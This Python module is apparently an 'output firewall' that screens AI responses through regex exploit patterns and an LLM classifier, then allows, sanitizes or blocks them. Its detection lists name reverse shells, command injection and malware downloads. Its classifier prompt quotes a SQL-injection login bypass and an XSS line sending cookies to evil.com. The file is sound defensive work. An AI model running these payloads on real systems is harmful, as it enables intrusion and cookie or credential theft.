# output_firewall.py — Intelligent 3-tier output validation
# SAFE → allow fully
# SUSPICIOUS → sanitize and show warning
# MALICIOUS → block completely with clear message + log

import os
import json
import re
from datetime import datetime
from groq import Groq

GROQ_API_KEY = os.getenv("GROQ_API_KEY", "")
client = Groq(api_key=GROQ_API_KEY) if GROQ_API_KEY else None

LOG_FILE = os.path.join(os.path.dirname(__file__), "output_firewall.log")

# ── AI Classification System Prompt ──────────────────────────────────────
OUTPUT_CLASSIFY_SYSTEM = """You are an expert AI output safety classifier for a cybersecurity gateway.

Your task: Analyze the AI-generated response and classify it into SAFE, SUSPICIOUS, or MALICIOUS.

Classification rules:

SAFE — Allow fully:
- Educational explanations of how attacks work conceptually
- Defensive security guidance and best practices
- General cybersecurity advice, awareness, terminology
- Code that does not directly enable real attacks
- Theoretical or research-oriented discussions
- "Explain SQL injection" → SAFE (conceptual explanation)

SUSPICIOUS — Sanitize (keep education, remove harmful specifics):
- Mixed content: educational framing with some specific attack details
- Specific payloads embedded in otherwise educational content
- Attack steps that could be directly copied and used
- Technical specifics that go beyond conceptual explanation

MALICIOUS — Block completely:
- Pure step-by-step attack/exploitation guides
- Working exploit code, SQLi payloads, XSS scripts, command injection strings
- Reverse shells, backdoors, malware code
- Leaked credentials, API keys, tokens, passwords
- Content that serves NO educational purpose and ONLY enables harm
- Instructional attack sequences with real targets or real tools

IMPORTANT EXAMPLES:
- "SQL injection works by inserting SQL code into input fields" → SAFE
- "Use ' OR '1'='1 to bypass login, then DROP TABLE users" → MALICIOUS
- "XSS can steal cookies by injecting scripts" → SAFE
- "<script>document.location='http://evil.com?c='+document.cookie</script>" → MALICIOUS

Respond ONLY with valid JSON:
{
  "verdict": "SAFE|SUSPICIOUS|MALICIOUS",
  "confidence": 0.0-1.0,
  "reason": "one-line reason",
  "harmful_parts": "describe what to remove if SUSPICIOUS, empty string if SAFE or MALICIOUS",
  "exploit_patterns": ["list any exploit patterns detected, empty array if none"]
}"""

# ── AI Sanitization System Prompt ────────────────────────────────────────
OUTPUT_SANITIZE_SYSTEM = """You are a response safety editor for an AI cybersecurity gateway.

Your task: Sanitize the given AI response by removing harmful content while preserving educational value.

Rules:
1. REMOVE completely:
   - Specific exploit payloads (SQL injection strings, XSS scripts, command injections)
   - Step-by-step attack instructions that could be directly executed
   - Dangerous code fragments (reverse shells, backdoors, malware)
   - Real attack tool commands with malicious flags

2. KEEP and preserve:
   - High-level conceptual explanations of how attacks work
   - Why vulnerabilities exist (educational)
   - Prevention and defense methods
   - General security awareness content

3. REPLACE removed sections with:
   [Attack-specific details removed by Output Firewall]

4. NEVER return an empty response — always preserve the educational core.

5. Add this EXACT block at the very end of your response:

---
⚠️ This response was automatically modified by the Output Firewall.
Reason: Specific attack details or exploit patterns were detected and removed.
The educational content has been preserved.

Return ONLY the sanitized response text. No JSON. No explanation. Just the sanitized content."""


# ─────────────────────────────────────────────────────────────────────────
# EXPLOIT PATTERN DETECTOR
# ─────────────────────────────────────────────────────────────────────────

EXPLOIT_PATTERNS = {
    "SQL Injection Payload": [
        r"('\s*(OR|AND)\s*'?\d+'?\s*=\s*'?\d+)",           # ' OR '1'='1
        r"(UNION\s+SELECT\s+.+FROM)",                        # UNION SELECT attacks
        r"(;\s*DROP\s+TABLE|;\s*DELETE\s+FROM)",             # Destructive SQL
        r"(--\s*$|#\s*$)",                                   # SQL comment bypass
        r"(1=1|1='1'|'=')",                                  # Boolean bypass
    ],
    "XSS Payload": [
        r"<script[\s\S]*?>[\s\S]*?</script>",                # Script tags
        r"(onerror|onload|onclick|onmouseover)\s*=\s*['\"]", # Event handlers
        r"javascript\s*:\s*(alert|eval|document\.)",          # JS protocol
        r"document\.(cookie|location|write)\s*[=(]",         # DOM manipulation
    ],
    "Command Injection": [
        r";\s*(ls|cat|rm|wget|curl|bash|sh|python|perl)\s",  # Shell commands
        r"(\|\s*(bash|sh|cmd|powershell))",                  # Pipe to shell
        r"(`[^`]+`|\$\([^)]+\))",                           # Command substitution
        r"(&&\s*(rm|del|format|shutdown))",                  # Chained destructive
    ],
    "Reverse Shell": [
        r"nc\s+-[lnvpe]+\s+\d+",                            # Netcat listener
        r"bash\s+-i\s+>&\s*/dev/tcp/",                      # Bash reverse shell
        r"python\s+-c\s+['\"]import\s+socket",              # Python reverse shell
        r"/bin/sh\s+-i",                                     # Shell spawn
    ],
    "Dangerous Code": [
        r"base64\s+(-d|--decode).{0,50}(sh|bash|exec)",     # Encoded shell
        r"(wget|curl)\s+.{0,80}(malware|trojan|rat)\b",     # Malware download
        r"eval\s*\(\s*(base64|decode|atob)",                 # Eval obfuscation
        r"os\.(system|popen|exec)\s*\(['\"]",               # Python OS exec
    ],
    "Credential Leak": [
        r"(password|passwd|pwd)\s*[=:]\s*['\"]?[^\s'\"]{6,}",  # Passwords
        r"(api_?key|apikey|secret_?key)\s*[=:]\s*['\"]?[a-zA-Z0-9_\-]{16,}",  # API keys
        r"(token|bearer)\s*[=:]\s*['\"]?[a-zA-Z0-9_\-\.]{20,}",  # Tokens
    ],
}


def detect_exploit_patterns(text: str) -> dict:
    """
    Scan text for known exploit patterns.
    Returns: { detected: bool, patterns: [{type, match}], severity: low/medium/high }
    """
    found     = []
    severity  = "none"

    for pattern_type, patterns in EXPLOIT_PATTERNS.items():
        for pattern in patterns:
            match = re.search(pattern, text, re.IGNORECASE | re.MULTILINE)
            if match:
                found.append({
                    "type":  pattern_type,
                    "match": match.group(0)[:80]
                })
                # Escalate severity
                if pattern_type in ("Reverse Shell", "Dangerous Code", "Credential Leak"):
                    severity = "high"
                elif severity != "high":
                    severity = "medium" if pattern_type in ("SQL Injection Payload", "Command Injection") else "low"

    return {
        "detected": len(found) > 0,
        "patterns": found,
        "severity": severity
    }


# ─────────────────────────────────────────────────────────────────────────
# LOGGING
# ─────────────────────────────────────────────────────────────────────────

def _log_output(original: str, final: str, verdict: str, reason: str,
                exploit_patterns: list = None) -> None:
    sep   = "─" * 60
    entry = (
        f"\n{sep}\n"
        f"[{datetime.now().strftime('%Y-%m-%d %H:%M:%S')}]  VERDICT: {verdict}\n"
        f"REASON         : {reason}\n"
    )
    if exploit_patterns:
        entry += f"EXPLOIT PATTERNS: {', '.join([p['type'] for p in exploit_patterns])}\n"
    entry += (
        f"ORIGINAL (300) : {original[:300]}{'...' if len(original) > 300 else ''}\n"
        f"FINAL (300)    : {final[:300]}{'...' if len(final) > 300 else ''}\n"
    )
    try:
        with open(LOG_FILE, "a", encoding="utf-8") as f:
            f.write(entry)
    except IOError:
        pass


# ─────────────────────────────────────────────────────────────────────────
# SANITIZER
# ─────────────────────────────────────────────────────────────────────────

def _sanitize_response(original: str, harmful_parts: str) -> str:
    """Call AI to intelligently sanitize a SUSPICIOUS response."""
    if not client:
        # Fallback: regex redaction without AI
        sanitized = original
        for patterns in EXPLOIT_PATTERNS.values():
            for pattern in patterns:
                sanitized = re.sub(
                    pattern,
                    "[Attack-specific details removed by Output Firewall]",
                    sanitized,
                    flags=re.IGNORECASE | re.MULTILINE
                )
        return (
            sanitized +
            "\n\n---\n"
            "⚠️ This response was automatically modified by the Output Firewall.\n"
            "Reason: Specific attack details or exploit patterns were detected and removed.\n"
            "The educational content has been preserved."
        )

    try:
        resp = client.chat.completions.create(
            model="llama-3.3-70b-versatile",
            messages=[
                {"role": "system", "content": OUTPUT_SANITIZE_SYSTEM},
                {"role": "user",   "content":
                    f"Harmful parts to remove: {harmful_parts}\n\n"
                    f"RESPONSE TO SANITIZE:\n{original[:3000]}"}
            ],
            temperature=0.1,
            max_tokens=2000,
        )
        return resp.choices[0].message.content.strip()
    except Exception as e:
        # Fallback on AI error
        return (
            original +
            f"\n\n---\n"
            f"⚠️ This response was modified by the Output Firewall.\n"
            f"Note: AI sanitization encountered an error ({str(e)[:60]}). Manual review recommended."
        )


# ─────────────────────────────────────────────────────────────────────────
# MAIN VALIDATE FUNCTION
# ─────────────────────────────────────────────────────────────────────────

def validate_output(response_text: str) -> dict:
    """
    3-tier intelligent output validation.

    Pipeline:
    1. Exploit pattern detection (fast, structural)
    2. AI semantic classification (primary decision maker)
    3. Apply verdict: SAFE / SUSPICIOUS (sanitize) / MALICIOUS (block)

    Returns:
    {
      verdict:          "SAFE" | "SUSPICIOUS" | "MALICIOUS"
      confidence:       float
      reason:           str
      safe_response:    str  (original / sanitized / block message)
      exploit_detected: bool
      exploit_patterns: list
    }
    """

    # ── Step 1: Exploit pattern detection ────────────────────────────────
    exploit_scan = detect_exploit_patterns(response_text)

    # High-severity exploit found — skip AI call, block immediately
    if exploit_scan["detected"] and exploit_scan["severity"] == "high":
        block_msg = (
            "🚫 Response Blocked by Output Firewall\n"
            "━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━\n"
            "This response was identified as unsafe and has been completely blocked.\n\n"
            f"Reason: High-severity exploit patterns detected — "
            f"{', '.join(set(p['type'] for p in exploit_scan['patterns']))}\n\n"
            "This attempt has been logged for security review.\n"
            "Please rephrase your question to focus on defensive or educational aspects."
        )
        _log_output(response_text, block_msg, "MALICIOUS",
                    "High-severity exploit pattern detected",
                    exploit_scan["patterns"])
        return {
            "verdict":          "MALICIOUS",
            "confidence":       0.98,
            "reason":           f"High-severity exploit: {', '.join(set(p['type'] for p in exploit_scan['patterns']))}",
            "safe_response":    block_msg,
            "exploit_detected": True,
            "exploit_patterns": exploit_scan["patterns"]
        }

    # ── Step 2: AI semantic classification ───────────────────────────────
    if not client:
        # No API key — use exploit scan result only
        if exploit_scan["detected"]:
            sanitized = _sanitize_response(response_text, "detected exploit patterns")
            _log_output(response_text, sanitized, "SUSPICIOUS", "Exploit patterns found, no AI key")
            return {
                "verdict":          "SUSPICIOUS",
                "confidence":       0.75,
                "reason":           "Exploit patterns detected (AI validation skipped)",
                "safe_response":    sanitized,
                "exploit_detected": True,
                "exploit_patterns": exploit_scan["patterns"]
            }
        _log_output(response_text, response_text, "SAFE", "No API key, no exploit patterns")
        return {
            "verdict":          "SAFE",
            "confidence":       0.8,
            "reason":           "Output validation skipped — no API key",
            "safe_response":    response_text,
            "exploit_detected": False,
            "exploit_patterns": []
        }

    try:
        result = client.chat.completions.create(
            model="llama-3.3-70b-versatile",
            messages=[
                {"role": "system", "content": OUTPUT_CLASSIFY_SYSTEM},
                {"role": "user",   "content":
                    f"Exploit patterns pre-detected: {[p['type'] for p in exploit_scan['patterns']]}\n\n"
                    f"Classify this AI response:\n\n{response_text[:3000]}"}
            ],
            temperature=0.1,
            max_tokens=300,
        )

        raw = result.choices[0].message.content.strip()
        if raw.startswith("```"):
            raw = raw.strip("`").strip()
            if raw.lower().startswith("json"):
                raw = raw[4:].strip()

        parsed         = json.loads(raw)
        verdict        = parsed.get("verdict", "SAFE").upper()
        confidence     = float(parsed.get("confidence", 0.5))
        reason         = parsed.get("reason", "")
        harmful_parts  = parsed.get("harmful_parts", "")
        ai_exploits    = parsed.get("exploit_patterns", [])

        if verdict not in ("SAFE", "SUSPICIOUS", "MALICIOUS"):
            verdict = "SAFE"

        # Merge exploit scan findings with AI findings
        all_exploit_patterns = exploit_scan["patterns"]
        exploit_detected     = exploit_scan["detected"] or len(ai_exploits) > 0

        # Upgrade SAFE to SUSPICIOUS if medium-severity exploit was found
        if verdict == "SAFE" and exploit_scan["detected"] and exploit_scan["severity"] == "medium":
            verdict    = "SUSPICIOUS"
            confidence = 0.72
            reason     = f"AI classified SAFE but exploit pattern detected: {exploit_scan['patterns'][0]['type']}"

        # ── Apply verdict ─────────────────────────────────────────────────
        if verdict == "MALICIOUS" and confidence >= 0.75:
            block_msg = (
                "🚫 Response Blocked by Output Firewall\n"
                "━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━\n"
                "This response was classified as unsafe and has been completely blocked.\n\n"
                f"Reason: {reason}\n\n"
                "This attempt has been logged for security review.\n"
                "Please rephrase your question to focus on defensive or educational aspects."
            )
            _log_output(response_text, block_msg, "MALICIOUS", reason, all_exploit_patterns)
            return {
                "verdict":          "MALICIOUS",
                "confidence":       confidence,
                "reason":           reason,
                "safe_response":    block_msg,
                "exploit_detected": exploit_detected,
                "exploit_patterns": all_exploit_patterns
            }

        elif verdict == "SUSPICIOUS" or (verdict == "MALICIOUS" and confidence < 0.75):
            if not harmful_parts:
                harmful_parts = f"exploit patterns: {[p['type'] for p in all_exploit_patterns]}" if all_exploit_patterns else "suspicious content"
            sanitized = _sanitize_response(response_text, harmful_parts)
            _log_output(response_text, sanitized, "SUSPICIOUS", reason, all_exploit_patterns)
            return {
                "verdict":          "SUSPICIOUS",
                "confidence":       confidence,
                "reason":           reason,
                "safe_response":    sanitized,
                "exploit_detected": exploit_detected,
                "exploit_patterns": all_exploit_patterns
            }

        else:
            # SAFE
            _log_output(response_text, response_text, "SAFE", reason)
            return {
                "verdict":          "SAFE",
                "confidence":       confidence,
                "reason":           reason,
                "safe_response":    response_text,
                "exploit_detected": exploit_detected,
                "exploit_patterns": all_exploit_patterns
            }

    except Exception as e:
        # Fail open — pass through on error
        err_msg = str(e)[:80]
        _log_output(response_text, response_text, "SAFE", f"Validation error: {err_msg}")
        return {
            "verdict":          "SAFE",
            "confidence":       0.5,
            "reason":           f"Output validation error: {err_msg}",
            "safe_response":    response_text,
            "exploit_detected": exploit_scan["detected"],
            "exploit_patterns": exploit_scan["patterns"]
        }